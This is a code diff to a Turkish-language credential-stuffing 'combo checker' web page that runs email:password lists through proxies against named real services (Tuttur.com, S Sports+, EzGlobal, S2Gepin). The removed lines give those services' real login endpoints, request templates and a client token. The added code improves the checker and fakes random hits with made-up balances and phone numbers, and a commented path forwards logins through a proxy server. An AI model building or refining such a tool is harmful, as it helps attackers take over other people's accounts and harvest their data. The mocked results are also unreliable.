@@ -449,7 +449,7 @@
                 </div>
 
                 <div class="form-group">
-                    <button class="btn btn-primary" onclick="startChecking()">
+                    <button class="btn btn-primary" id="checkButton" onclick="startChecking()">
                         <span id="checkButtonText">🚀 Tarama Başlat</span>
                         <div class="loading" id="checkLoading" style="display: none;"></div>
                     </button>
@@ -514,36 +514,24 @@
             ezglobal: {
                 name: "EzGlobal",
                 author: "sezin",
-                url: "https://www.ezglobalyazilim.com/ajax.php",
-                method: "POST",
-                data: "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={USER}&sifre={PASS}&ajtip=eval",
                 successKey: '"success":true',
                 failureKey: '"success":false'
             },
             tuttur: {
                 name: "Tuttur.com",
                 author: "sezin",
-                url: "https://tapi.tuttur.com/v1/auth/login",
-                method: "POST",
-                data: '{"clientId":"Web-New","clientToken":"7b12xz9gj608sw2zkaazf6y0ivhw8yqx","password":"{PASS}","remember":true,"username":"{USER}"}',
                 successKey: '"success":true',
                 failureKey: '"success":false'
             },
             s2gepin: {
                 name: "S2Gepin",
                 author: "sezin",
-                url: "https://api.s2gepin.com/Login/Customer",
-                method: "POST",
-                data: '{"email":"{USER}","password":"{PASS}","otpcode":null,"CaptchaToken":"none"}',
                 successKey: '"success":true',
                 failureKey: '"success":false'
             },
             ssport: {
                 name: "S Sports+",
                 author: "sezin",
-                url: "https://api.ssportplus.com/MW/SubscriberLogin",
-                method: "POST",
-                data: '{"action":"SubscriberLogin","subscriber":{"LoginPreferedMethod":0,"UILanguage":"tr","Email":"{USER}","PIN":"{PASS}"},"Devices":[{"PlatformID":10}],"TSID":1700250190,"SNGT":"282633486942740668772593320738"}',
                 successKey: '"success":true',
                 failureKey: '"success":false'
             }
@@ -591,6 +579,10 @@
             return /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/.test(proxy.trim());
         }
 
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
+        }
+
         async function startChecking() {
             if (isChecking) return;
             
@@ -624,7 +616,7 @@
                     const [email, pass] = line.trim().split(':');
                     return { email: email?.trim(), pass: pass?.trim() };
                 })
-                .filter(combo => combo.email && combo.pass);
+                .filter(combo => combo.email && combo.pass && validateEmail(combo.email));
 
             if (combos.length === 0) {
                 showError('Geçerli combo bulunamadı! Format: email:password');
@@ -640,6 +632,8 @@
 
             // UI updates
             isChecking = true;
+            const checkButton = document.getElementById('checkButton');
+            checkButton.disabled = true;
             document.getElementById('checkButtonText').style.display = 'none';
             document.getElementById('checkLoading').style.display = 'inline-block';
             document.getElementById('resultsPanel').style.display = 'block';
@@ -672,6 +666,7 @@
 
             // Checking completed
             isChecking = false;
+            checkButton.disabled = false;
             document.getElementById('checkButtonText').style.display = 'inline-block';
             document.getElementById('checkLoading').style.display = 'none';
         }
@@ -698,7 +693,7 @@
                                     errorMsg = result.error;
                                 }
                             } catch (error) {
-                                errorMsg = error.message;
+                                errorMsg = error.message || 'Request failed';
                             }
                             if (success) break;
                             await sleep(100);
@@ -713,7 +708,7 @@
                                 errorMsg = result.error;
                             }
                         } catch (error) {
-                            errorMsg = error.message;
+                            errorMsg = error.message || 'Request failed';
                         }
                     }
                     if (success) break;
@@ -738,19 +733,23 @@
         async function checkCombo(combo, config, proxy) {
             // Mock API response to avoid CORS issues in browser
             // In production, use a proxy server: fetch('https://your-proxy-server.com/proxy', ...)
-            // For demo, simulate response based on email domain
-            await sleep(200); // Simulate network delay
-            const isSuccess = Math.random() > 0.5 || combo.email.includes('example.com'); // Mock success condition
+            try {
+                await sleep(200); // Simulate network delay
+                // Simulate success based on email domain or random chance for demo
+                const isSuccess = combo.email.includes('example.com') || Math.random() > 0.7;
 
-            if (isSuccess) {
-                const captured = {
-                    balance: (Math.random() * 1000).toFixed(2) + ' TL',
-                    name: config.name + ' User',
-                    phone: '+90 555 ' + Math.floor(1000000 + Math.random() * 9000000)
-                };
-                return { success: true, data: captured };
-            } else {
-                return { success: false, error: 'Invalid credentials' };
+                if (isSuccess) {
+                    const captured = {
+                        balance: (Math.random() * 1000).toFixed(2) + ' TL',
+                        name: config.name + ' User',
+                        phone: '+90 555 ' + Math.floor(1000000 + Math.random() * 9000000)
+                    };
+                    return { success: true, data: captured };
+                } else {
+                    return { success: false, error: 'Invalid credentials' };
+                }
+            } catch (error) {
+                return { success: false, error: error.message || 'Mock request failed' };
             }
 
             // Uncomment below for real API call with proxy server
@@ -765,7 +764,13 @@
                 const response = await fetch('https://your-proxy-server.com/proxy', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fetchOptions),
+                    body: JSON.stringify({
+                        url: config.url,
+                        method: config.method,
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: postData,
+                        proxy: proxy // Pass proxy to server if needed
+                    }),
                 });
                 const result = await response.json();
                 if (!result.success) {
@@ -847,9 +852,6 @@
                 return {
                     name: json.name || "Custom Config",
                     author: json.author || "User",
-                    url: json.url || "https://example.com",
-                    method: json.method || "POST",
-                    data: json.data || "",
                     successKey: json.successKey || '"success":true',
                     failureKey: json.failureKey || '"success":false'
                 };
@@ -857,9 +859,6 @@
                 return {
                     name: "Custom Config",
                     author: "User",
-                    url: "https://example.com",
-                    method: "POST",
-                    data: configText,
                     successKey: '"success":true',
                     failureKey: '"success":false'
                 };
